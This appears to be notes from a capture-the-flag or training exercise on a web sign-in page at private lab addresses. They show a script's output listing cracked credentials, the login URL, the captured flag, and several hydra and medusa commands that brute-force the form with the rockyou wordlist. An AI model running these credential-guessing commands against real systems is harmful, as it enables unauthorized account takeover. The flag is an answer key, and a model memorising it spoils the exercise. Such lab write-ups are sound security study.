

db from rockyou wordlist
```
➜  Breach10- git:(main) ✗ sh Ressources/script.sh 10.12.100.231 Ressources/db.txt Ressources/db.txt 
Success: Credentials found, Username - eugene & Password - shadow
Success: Credentials found, Username - evelyn & Password - shadow
Success: Credentials found, Username - excel & Password - shadow
```

`http://IP/?page=signin&username=eugene&password=shadow&Login=Login`

THE FLAG IS : B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2

hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt 10.11.100.96 http-post-form "/index.php?page=signin:username=^USER^&password=^PASS^&Login=Login:Incorrect username or password." > /home/kali/Desktop/pwd

hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -t 4 -w 5 10.11.100.96 http-get "/index.php?page=signin&username=^USER^&password=^PASS^&Login=Login"

medusa -h 10.12.100.231 -U /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/index.php?page=signin -T 5 -F

medusa -h 10.12.100.231 -U /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -M http -m FORM:POST:/index.php?page=signin:username=^USER^&password=^PASS^:Incorrect
